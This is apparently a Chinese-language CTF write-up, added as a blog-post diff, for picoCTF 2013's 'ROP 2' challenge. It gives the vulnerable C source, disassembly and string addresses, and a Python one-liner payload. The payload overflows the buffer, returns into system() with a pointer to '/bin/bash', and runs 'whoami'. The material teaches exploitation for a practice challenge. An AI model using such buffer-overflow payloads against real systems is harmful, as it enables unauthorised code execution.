@@ -1,0 +1,81 @@
+---
+layout: post
+title: ROP 2
+categories: writeups
+tags: pwn
+ctfsite: picoctf-2013
+challenge_url: https://github.com/picoCTF/picoCTF-2013-problems/tree/master/ROP%202
+---
+
+这是 [ROP 1]({% url_by_slug picoctf-2013-rop-1 %}) 的进阶版。`not_called` 不再直执行 `/bin/bash`：
+
+```c
+#undef _FORTIFY_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char * not_used = "/bin/bash";
+
+int not_called() {
+	return system("/bin/date");
+}
+
+void vulnerable_function() {
+	char buf[128];
+	read(STDIN_FILENO, buf, 256);
+}
+
+void be_nice_to_people() {
+	// /bin/sh is usually symlinked to bash, which usually drops privs. Make
+	// sure we don't drop privs if we exec bash, (ie if we call system()).
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+}
+
+int main(int argc, char** argv) {
+    be_nice_to_people();
+	vulnerable_function();
+	write(STDOUT_FILENO, "Hello, World\n", 13);
+}
+```
+
+{% include writeup_begin.html %}
+
+由于 `not_called` 不再直接调用 `system("/bin/bash")`，我们需要修改传入 `system` 的参数。`system` 只接受一个参数，对于 32 位程序来说，当我们调用 `system` 时，栈顶的数据就会被传入 `system`。
+
+考虑到 `vulnerable_function` 没有参数，那么在函数返回后，esp 就会变为当前 ebp + 4，也就是返回地址再下面 4 个字节。所以只要我们把 `not_used` 的地址写到返回地址的下方，再直接调用 `call system` 就可以了。
+
+首先看一下 `not_used` 中 `call system` 一句的地址：
+
+```.asm
+/ (fcn) sym.not_called 20
+|   sym.not_called ();
+|           0x080484a4      push ebp
+|           0x080484a5      mov ebp, esp
+|           0x080484a7      sub esp, 0x18
+|           0x080484aa      mov dword [esp], str.bin_date ; [0x804861a:4]=0x6e69622f ; "/bin/date" ; const char *string
+|           0x080484b1      call sym.imp.system ; int system(const char *string)
+|           0x080484b6      leave
+\           0x080484b7      ret
+```
+
+我们就直接返回到 `0x080484b1` 即可；再看一下 `not_used` 字符串的地址：
+
+```
+[0x080483f0]> iz
+000 0x00000610 0x08048610   9  10 (.rodata) ascii /bin/bash
+001 0x0000061a 0x0804861a   9  10 (.rodata) ascii /bin/date
+002 0x00000624 0x08048624  13  14 (.rodata) ascii Hello, World\n
+```
+
+地址是 `0x08048610`。因此构造一下输入：
+
+```python
+python -c "print '0' * 0x88 + '0000\xb1\x84\x04\x08\x10\x86\x04\x08' + '0' * (256 - 0x88 - 12) + 'whoami\x0a'" | ./rop2-20f65dd0bcbe267d
+                              ↑EBP ↑----返回地址----↑----栈顶内容----↑   ↑缓冲区剩余部分
+```
+
+就可以了。这段输入将在打开的 bash 中执行 `whoami`，打印出当前用户。由于不明原因，我的 Ubuntu 18.04 无法使用 cat 继续读入标准输入，所以只好把命令加在输入的 256 个字符之后了。
+
+{% include writeup_end.html %}
